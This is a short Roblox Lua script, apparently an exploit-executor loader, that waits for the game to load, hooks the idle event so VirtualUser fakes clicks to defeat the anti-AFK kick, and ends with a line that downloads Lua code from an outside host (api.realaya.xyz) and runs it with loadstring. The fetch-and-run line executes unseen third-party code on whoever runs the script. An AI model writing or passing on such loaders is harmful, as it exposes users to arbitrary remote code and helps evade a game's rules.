repeat
	task.wait()
until game:IsLoaded() and game:GetService("Players") and game:GetService("Players").LocalPlayer and workspace

do
	Players = game:GetService("Players")
	Client = Players.LocalPlayer
	VirtualUser = game:GetService("VirtualUser")
	Client.Idled:Connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)
end

loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/z2ioh2fx175gbqdsenk39xsy1dbjxjp3.lua"))()
